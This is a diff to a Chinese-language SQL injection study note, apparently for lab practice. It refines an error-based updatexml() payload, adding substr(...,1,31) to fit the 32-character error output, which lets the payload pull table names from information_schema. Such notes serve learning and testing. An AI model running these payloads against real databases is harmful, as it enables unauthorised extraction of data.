@@ -375,10 +375,11 @@ sql源码
 
 回显`XPATH syntax error: '~security'`
 
-(2) 所有库名 (注意)
+(2) 所有库名 (注意限制截取字符串的长度)
 
-`1' and updatexml(1,concat(0x7e,(select group_concat(table_name) from information_schema.tables where table_name)),1) and '1' = '1`
+`1' and updatexml(1,concat(0x7e,substr((select group_concat(table_name) from information_schema.tables where table_name),1,31)),1) and '1' = '1`
 
+(3) 查列表名
 
 ## SQL数据库的补充知识
 一 基础字符部分
@@ -473,7 +474,7 @@ sql源码
 
 含义: `UPDATEXML(XML_target, XPath_expr, new_XML)`在一段 XML 里用 XPath 定位节点，把匹配到的节点替换成 new_XML，返回修改后的 XML
 
-注: updatexml()只显示32个字符，所以在注入时要用 `1,31`限制显示的长度
+注: updatexml()只显示32个字符，所以在注入时要用 `substr((**)1,31)`限制显示的长度
 
 1. 为什么这里用`updatexml()`:
 
